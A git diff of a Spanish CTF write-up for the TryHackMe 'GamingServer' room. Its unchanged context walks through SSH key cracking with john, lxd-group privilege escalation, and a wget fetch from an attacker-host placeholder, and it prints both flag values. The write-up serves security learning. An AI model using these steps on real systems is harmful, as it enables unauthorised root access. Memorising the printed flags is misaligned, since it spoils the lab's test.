@@ -1,10 +1,12 @@
 ---
-layout: default
+title: "GamingServer - TryHackMe Writeup"
+date: 2025-04-19 10:00:00 +0100
+categories: [Linux, Easy]
+tags: [tryhackme, linux, ssh, john, rsa, lxd, privilege-escalation]
+image: /imagenes/GamingServer.png
 ---
 
 # GamingServer CTF
-
-![GamingServer CTF](/imagenes/GamingServer.png)
 
 ---
 
@@ -29,7 +31,7 @@ nmap -sC -sV -oN gamingserver.nmap <TARGET_IP>
 - HTTP → Título: **House of Danak** → servidor de gaming
 - SSH disponible → posible acceso con clave RSA
 
-![fase1.1_nmap_scan.png](fase1.1_nmap_scan.png)
+![fase1.1_nmap_scan.png](/linux/GamingServer/fase1.1_nmap_scan.png)
 
 ---
 
@@ -51,15 +53,15 @@ http://<TARGET_IP>
 ```
 
 **Directorios descubiertos:**
-- `/uploads` → Status 301 🔴
-- `/secret` → Status 301 🔴
+- `/uploads` → Status 301
+- `/secret` → Status 301
 - `robots.txt` → Status 200
 
 **Hallazgo crítico en código fuente:**
 - Comentario oculto: `john, please add some actual content to the site! lorem ipsum is horrible to look at.`
-- **Usuario identificado: `john`** 🔴 → guardamos este nombre para el acceso SSH posterior
+- **Usuario identificado: `john`** → guardamos este nombre para el acceso SSH posterior
 
-![fase1.2_gobuster_web_source.png](fase1.2_gobuster_web_source.png)
+![fase1.2_gobuster_web_source.png](/linux/GamingServer/fase1.2_gobuster_web_source.png)
 
 ---
 
@@ -72,13 +74,13 @@ http://<TARGET_IP>/secret/
 ```
 
 **Hallazgos críticos:**
-- `/uploads/dict.lst` → Wordlist de contraseñas 🔴 → usada para crackear la passphrase RSA
+- `/uploads/dict.lst` → Wordlist de contraseñas → usada para crackear la passphrase RSA
 - `/uploads/manifesto.txt` → The Hacker Manifesto → no útil directamente
-- `/secret/secretKey` → **Clave RSA privada encriptada** 🔴 → vector de acceso SSH
+- `/secret/secretKey` → **Clave RSA privada encriptada** → vector de acceso SSH
 
-![fase1.3_secret_key.png](fase1.3_secret_key.png)
+![fase1.3_secret_key.png](/linux/GamingServer/fase1.3_secret_key.png)
 
-![fase1.3_uploads_dict.png](fase1.3_uploads_dict.png)
+![fase1.3_uploads_dict.png](/linux/GamingServer/fase1.3_uploads_dict.png)
 
 ---
 
@@ -97,7 +99,7 @@ ls -la
 - `secretKey` → Clave RSA privada descargada y con permisos correctos
 - `dict.lst` → Wordlist descargada para crackeo
 
-![fase1.4_download_files.png](fase1.4_download_files.png)
+![fase1.4_download_files.png](/linux/GamingServer/fase1.4_download_files.png)
 
 ---
 
@@ -115,9 +117,9 @@ john key.hash --wordlist=dict.lst
 | Campo | Valor |
 |-------|-------|
 | Archivo | secretKey |
-| **Passphrase** | **letmein** 🔴 |
+| **Passphrase** | **letmein** |
 
-![fase1.5_john_crack.png](fase1.5_john_crack.png)
+![fase1.5_john_crack.png](/linux/GamingServer/fase1.5_john_crack.png)
 
 ---
 
@@ -137,7 +139,7 @@ ssh -i secretKey john@<TARGET_IP>
 - Sistema: Ubuntu 18.04.4 LTS
 - Hostname: `exploitable`
 
-![fase2.1_ssh_john.png](fase2.1_ssh_john.png)
+![fase2.1_ssh_john.png](/linux/GamingServer/fase2.1_ssh_john.png)
 
 ---
 
@@ -156,7 +158,7 @@ cat user.txt
 a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
 ```
 
-![fase2.2_user_flag.png](fase2.2_user_flag.png)
+![fase2.2_user_flag.png](/linux/GamingServer/fase2.2_user_flag.png)
 
 ---
 
@@ -175,11 +177,11 @@ groups
 
 | Usuario | Grupos |
 |---------|--------|
-| john | adm, cdrom, sudo, dip, plugdev, **lxd** 🔴 |
+| john | adm, cdrom, sudo, dip, plugdev, **lxd** |
 
 **Vector:** john pertenece al grupo `lxd` → montamos el filesystem del host en un contenedor privilegiado → acceso como root al sistema de archivos completo
 
-![fase3.1_id_groups.png](fase3.1_id_groups.png)
+![fase3.1_id_groups.png](/linux/GamingServer/fase3.1_id_groups.png)
 
 ---
 
@@ -197,7 +199,7 @@ ls *.gz
 **Hallazgos:**
 - Imagen Alpine generada: `alpine-v3.23-x86_64-20260501_2058.tar.gz`
 
-![fase3.2_alpine_build.png](fase3.2_alpine_build.png)
+![fase3.2_alpine_build.png](/linux/GamingServer/fase3.2_alpine_build.png)
 
 ---
 
@@ -217,7 +219,7 @@ wget http://<ATTACKER_IP>:8080/alpine-v3.23-x86_64-20260501_2058.tar.gz
 ls
 ```
 
-![fase3.3_transfer_alpine.png](fase3.3_transfer_alpine.png)
+![fase3.3_transfer_alpine.png](/linux/GamingServer/fase3.3_transfer_alpine.png)
 
 ---
 
@@ -238,9 +240,9 @@ lxc exec ignite -- /bin/sh
 - Imagen importada correctamente como `myimage`
 - Contenedor `ignite` creado con `security.privileged=true`
 - Filesystem del host montado en `/mnt/root`
-- Shell obtenida dentro del contenedor como **root** 🔴
+- Shell obtenida dentro del contenedor como **root**
 
-![fase3.4_lxd_exploit.png](fase3.4_lxd_exploit.png)
+![fase3.4_lxd_exploit.png](/linux/GamingServer/fase3.4_lxd_exploit.png)
 
 ---
 
@@ -259,4 +261,4 @@ cat /mnt/root/root/root.txt
 2e337b8c9f3aff0c2b3e8d4e6a7c88fc
 ```
 
-![fase3.5_root_flag.png](fase3.5_root_flag.png)
+![fase3.5_root_flag.png](/linux/GamingServer/fase3.5_root_flag.png)
